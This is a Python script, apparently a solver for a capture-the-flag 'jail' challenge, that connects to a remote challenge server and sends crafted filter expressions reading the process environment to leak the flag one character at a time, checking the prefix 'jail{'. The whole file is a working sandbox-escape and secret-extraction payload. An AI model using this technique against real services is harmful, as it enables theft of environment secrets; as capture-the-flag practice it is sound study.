import socket
import solve_remote_live, json

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def main():
    s = socket.create_connection(("challs.pyjail.club", 20219), timeout=15)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    buf = b""
    while b"expr: " not in buf:
        chunk = s.recv(4096)
        if not chunk: break
        buf += chunk
    buf = buf.split(b"expr: ", 1)[1]
    
    expected = [
        (0, 'j', 106),
        (1, 'a', 98),
        (2, 'i', 107),
        (3, 'l', 111),
        (4, '{', 127),
    ]
    
    print("[*] Verifying prefix 'jail{' on remote...")
    for pos, char, val in expected:
        if val not in CHAINS:
            print(f"[-] Value {val} not in chains!")
            continue
        pred = predicate(CHAINS[val])
        expr = f"env|flatten|sort|last|explode|tostream|flatten|add|{pred}|error\n"
        s.sendall(expr.encode())
        
        token_re = solve_remote_live.TOKEN_RE
        while True:
            m = token_re.search(buf)
            if m:
                ans = m.group(1).decode()
                buf = buf[m.end():]
                print(f"[Pos {pos}] char '{char}' (add val {val}): {ans}")
                break
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
            
    s.close()

if __name__ == "__main__":
    main()
